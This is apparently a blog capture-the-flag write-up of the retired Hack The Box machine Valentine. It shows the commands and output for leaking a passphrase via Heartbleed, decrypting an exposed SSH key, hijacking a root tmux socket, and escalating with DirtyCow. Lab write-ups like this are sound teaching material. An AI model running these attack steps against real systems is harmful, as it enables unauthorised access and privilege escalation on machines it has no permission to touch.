---
layout: post
title: "Bleeding Heart"
subtitle: "HTB Valentine — Heartbleed leaks a passphrase, and the box hands you root twice over"
date: 2018-08-04 12:00:00 +0000
description: "Heartbleed dressed up as a love note. The bug bleeds the passphrase to an encrypted SSH key straight out of server memory, and then the box hands you root two different ways — a tmux session someone left running, and a kernel that never grew up."
image: /assets/og/bleeding-heart.png
tags: [hackthebox, heartbleed, linux, privesc, writeup]
---

Valentine is a love letter written in leaked memory. It came out the year everyone was still scared of a heartbeat — and it knows it, because the whole front page is just the Heartbleed logo, mounted like a trophy. There's no subtlety to the hint. The box is wearing the exploit on its chest and daring you to read it. So we read it, and the server bleeds us a passphrase one stolen chunk of RAM at a time.

```
        V A L E N T I N E
        =================
        GET /  →   ♥   the logo, mounted like a trophy
                   |
        heartbeat ?  )))  "are you still there"
        heartbeat !  (((  "yes — and here are 64kb
                          of whatever i was holding"
                   |
                   v
        a passphrase falls out of the wound.
        the key was always going to open.
                                            血
```

## 0x01 · the card on the table

Three ports, no games. SSH, HTTP, HTTPS — and a wildcard on UDP 5353.

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
```

That OpenSSH version is a fossil. `5.9p1` puts us on Ubuntu 12.04 Precise — a release that went end-of-life in 2017 and was already a ghost when this box was live. Old SSH is rarely the door, but it's a tell: nothing on this host has been patched in years. Hold that thought, it pays out twice at the end.

The website is a single image:

```html
<center><img src="omg.jpg"/></center>
```

The image is the Heartbleed logo. The box is not asking you to guess.

## 0x02 · the bug that bled

Heartbleed (CVE-2014-0160) is not a clever exploit. It's a server that fails to check its own homework. The TLS heartbeat says *"send me back this 4-byte string, and by the way it's 64 kilobytes long."* Vulnerable OpenSSL shrugs and sends back the 4 bytes plus 64KB of whatever happened to be sitting next to it in memory — session keys, POSTed passwords, fragments of other people's requests. You're not breaking in. You're reading the server's short-term memory over its shoulder. Picture asking a librarian to read back the one sentence you just handed her — and instead she reads that sentence *plus* two random pages off her desk: someone's letter, a card receipt, a sticky note with a password. You asked for four bytes; the server overshares sixty-four thousand.

`searchsploit heartbleed`, grab a memory-disclosure script, and point it at 443:

```
# python 32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00"
...
WARNING: server returned more data than it should - server is vulnerable!
```

One pull is a slot machine. So you yank the lever a few thousand times and dedupe the haul:

```
for i in $(seq 1 100000); do python 32764.py 10.10.10.79 \
  | grep -v "00 00 00 00 00 00 00 00" > data_dump/data_dump$i; done
fdupes -rf . | grep -v '^$' > files && xargs -a files rm -v
```

In the wreckage, three gifts: references to `/encode.php` and `/decode.php`, and a base64 blob handed to the decoder:

```
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

Which is `heartbleedbelievethehype`. Keep it. A passphrase with no lock is just a word — but this box has a lock coming.

## 0x03 · /dev and the locked drawer

Heartbleed gets the headline; `gobuster` gets the keys. A dirbust turns up `/dev`, directory listing wide open, holding two files — `notes.txt` and `hype_key`.

`notes.txt` is a developer talking themselves into the grave:

```
To do:
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
```

`hype_key` is a wall of hex. Decode it and an encrypted RSA private key falls out:

```
# cat hype_key | xxd -r -p > hype_key_encrypted
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
...
```

`Proc-Type: 4,ENCRYPTED` — the key wants a passphrase. And we bled one out of memory two sections ago. The wound and the lock were always the same puzzle:

```
# openssl rsa -in hype_key_encrypted -out hype_key_decrypted
Enter pass phrase for hype_key_encrypted:   heartbleedbelievethehype
writing RSA key
```

## 0x04 · the way in

The filename is the username. SSH in as `hype`:

```
# ssh -i hype_key_decrypted hype@10.10.10.79
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
hype@Valentine:~$ cat Desktop/user.txt
████████████████████████████████
```

`Ubuntu 12.04`, kernel `3.2.0-23`. The fossil from the nmap confirmed in the login banner. Now the box pays out its old age twice.

## 0x05 · root, the elegant way

Look at the process list and someone left the back door not just unlocked but propped open with a brick:

```
hype@Valentine:~$ ps -ef | grep tmux
root  1022  1  0 Jul25 ?  00:00:54 /usr/bin/tmux -S /.devs/dev_sess
```

A `tmux` server, running as root, listening on a socket. And the socket is group-readable by *us*:

```
hype@Valentine:~$ ls -l /.devs
srw-rw---- 1 root hype 0 Jul 25 15:07 dev_sess
```

tmux's whole security model is "if you can touch the socket, you can have the session." The socket is owned `root:hype`. We are hype. So we walk in:

```
hype@Valentine:~$ tmux -S /.devs/dev_sess
root@Valentine:/home/hype# id
uid=0(root) gid=0(root) groups=0(root)
```

No exploit. No payload. Just an admin who detached from a root shell and never came back, and a socket permission that turned "their session" into "anyone's session." This is the elegant path because it isn't a vulnerability in code — it's a vulnerability in a habit.

## 0x06 · root, the brute way

For completeness, the box also can't say no to the obvious. `uname -a` is `3.2.0-23-generic`, built in 2012 — squarely inside the DirtyCow window (CVE-2016-5195). Kernel exploits are a last resort, not a first move; they're loud and they crash boxes. But here it's free:

```
hype@Valentine:/dev/shm$ gcc -pthread 40839.c -o c -lcrypt && ./c
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line: firefart:fifdjzBMn8d5E:0:0:pwned:/root:/bin/bash
hype@Valentine:/dev/shm$ su firefart
firefart@Valentine:/dev/shm# id
uid=0(firefart) gid=0(root) groups=0(root)
```

DirtyCow races a copy-on-write fault to overwrite a file you only have read access to — here, `/etc/passwd` — and writes a brand-new root user into it. Picture a museum that lets you sketch your own copy of a painting but never touch the original. DirtyCow scribbles on the copy and the original in the very same instant — faster than the guard can tell them apart — and the museum ends up hanging your scribble as the real thing. Two paths, same root. One was a habit, one was a calendar.

## 0x07 · the honest caveat

Heartbleed is twelve years old now and the lesson everyone took from it was the wrong one. People remember "patch OpenSSL." The actual lesson is the one this box quietly stacks on top: **a leaked secret and a locked secret are the same secret.** The passphrase bled out of memory was worthless on its own. It only became root because someone stored an encrypted private key on a world-listable web path and reused a phrase short enough to bleed. The bug bought the ammunition; the bad habits aimed it.

And the privesc that I'd actually lose sleep over isn't DirtyCow. A kernel CVE is a date on a patch calendar — boring, fixable, the kind of thing a `do-release-upgrade` kills forever. The tmux socket is the scary one, because it ships green. Nothing was unpatched. Nobody ran an exploit. An engineer ran a root shell inside a shared session, walked away, and the file permissions did exactly what they were told. You cannot `apt upgrade` your way out of that. Hold both: the patch fixes the kernel, but only paranoia fixes the person.

## 0x08 · outro

```
the server bled a word it was holding for someone else.
the word fit a lock left in a public drawer.
the lock opened a door, and behind the door
        root was already logged in, just looking the other way.

two roots. one was a missing patch. one was a missing habit.
only one of them gets fixed on a tuesday.

read the leak. mind the socket. wear black.

                                                            EOF
```

---

*HTB: Valentine — retired 28 Jul 2018. an easy box that's really a lecture on secret reuse wearing a 2014 costume. if you're following along, the heartbeat still bleeds in a lab and nowhere you don't own.*
